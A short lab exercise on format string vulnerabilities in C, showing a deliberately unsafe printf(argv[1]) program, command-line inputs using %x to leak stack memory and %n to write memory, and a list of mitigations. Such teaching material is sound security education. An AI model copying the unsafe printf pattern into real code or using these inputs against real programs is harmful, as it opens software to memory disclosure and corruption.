# 🧪 Lab: Format String Vulnerability

## 🎯 Goal
- Exploit format string bug
- Leak memory addresses
- Overwrite values with `%n`

## 🔬 Vulnerable Code
```c
#include <stdio.h>

int main(int argc, char **argv) {
    printf(argv[1]); // unsafe
    return 0;
}
```
## 🚀 Exploitation

Run: ./a.out AAAA.%x.%x.%x

Memory leak from stack

Use %n to write arbitrary values

Example:

```bash
./vuln $(python3 -c 'print("%x.%x.%x.%x%n")')
```
## 🛡️ Mitigations

Use format specifiers (printf("%s", argv[1]))

Compiler flags -Wformat

Runtime protections


---
